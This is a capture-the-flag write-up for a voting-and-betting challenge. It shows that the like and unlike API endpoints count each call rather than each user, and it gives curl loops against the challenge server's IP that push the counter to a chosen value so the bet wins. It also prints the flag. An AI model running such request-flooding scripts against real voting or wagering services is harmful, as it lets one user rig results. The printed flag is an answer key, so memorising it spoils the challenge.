# Writeup: The Battle of the Strongest

## Flag

`KubSTU(Y0u_ar3_champ10n)`

## Solve

The "voting" game runs in 5-minute rounds: anyone can `POST /api/like` (or `/api/unlike`) to bump a global counter, and `POST /api/bet {"bet": N}` predicts the count at round end. Guess right → flag.

The unsafe part: `/api/like` and `/api/unlike` are **per-call**, not per-user — one account can spam likes and drive the counter to any value. So the prediction is fully under our control.

```bash
# register + login
curl -c c.txt -X POST http://155.212.185.30/register   -H 'Content-Type: application/json' -d '{"username":"u","password":"p"}'
curl -c c.txt -b c.txt -X POST http://155.212.185.30/login_user -H 'Content-Type: application/json' -d '{"username":"u","password":"p"}'

# zero out + place bet + drive likes to 7
for i in $(seq 1 20); do curl -b c.txt -X POST http://155.212.185.30/api/unlike -H 'Content-Type: application/json' -d '{}' >/dev/null; done
curl -b c.txt -X POST http://155.212.185.30/api/bet  -H 'Content-Type: application/json' -d '{"bet":7}'
for i in $(seq 1 7);  do curl -b c.txt -X POST http://155.212.185.30/api/like   -H 'Content-Type: application/json' -d '{}' >/dev/null; done
```

When the round ends, `/dashboard` renders the win banner with `KubSTU(Y0u_ar3_champ10n)` (best to re-sync `/api/likes` near the boundary and adjust if other players added likes).
